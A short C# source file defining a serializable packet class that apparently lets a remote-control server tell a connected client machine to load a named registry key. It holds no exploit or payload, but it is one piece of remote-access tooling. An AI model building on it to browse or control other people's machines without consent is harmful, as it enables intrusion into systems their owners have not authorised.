using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoLoadRegistryKey : IPacket
    {
        public string RootKeyName { get; set; }

        public DoLoadRegistryKey(string rootKeyName)
        {
            RootKeyName = rootKeyName;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
